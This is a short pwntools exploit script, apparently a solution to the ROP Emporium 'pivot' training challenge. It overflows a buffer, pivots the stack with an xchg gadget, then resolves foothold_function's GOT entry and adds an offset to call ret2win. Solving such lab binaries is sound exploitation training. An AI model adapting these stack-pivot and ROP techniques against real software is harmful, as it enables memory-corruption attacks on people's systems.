from pwn import *
import re

e = ELF('./pivot')
p = e.process()

# raw_input('attach gdb')

recvd = p.recv().decode()

# address where longer chain is written
addr = re.findall('0x[0-9a-f]{12}', recvd)[0]
addr = int(addr, 16)
addr = p64(addr)

# dynamically imported function - foothold_function
foothold_plt = p64(0x400850)
foothold_got = p64(0x602048)

# offset for ret2win function from foothold_function
# calculated using objdump: 00000abe - 00000970
offset = p64(0x14e)

# padding for buffer overflow
padding = b'A' * 40

# gadgets
# pop rax ; ret
pop_rax = p64(0x400b00)

# call rax
call_rax = p64(0x40098e)

# mov rax, qword ptr [rax] ; ret
rax_val = p64(0x0000000000400b05)

# xchg rax, rsp ; ret
xchg = p64(0x0000000000400b02)

# pop rbp ; ret
pop_ebx = p64(0x0000000000400900)

# add rax, rbp ; ret
add = p64(0x0000000000400b09)

# short chain for overflowing stack and pivoting stack to longer chain
# achieved by swapping eax and esp
short = padding
short += pop_rax
short += addr
short += xchg

# new stack - longer chain
# call to foothold_plt to populate the got entry
long = foothold_plt

# move address of got to eax
long += pop_rax
long += foothold_got

# get value of got in eax
long += rax_val

# load offset to ebx
long += pop_ebx
long += offset

# add offset to eax (got entry of foothold_function)
long += add

# call eax (address of ret2win)
long += call_rax

p.sendline(long)
print(p.recv().decode())
p.sendline(short)

print(p.recv().decode())
flag = p.recv().decode()

success(flag)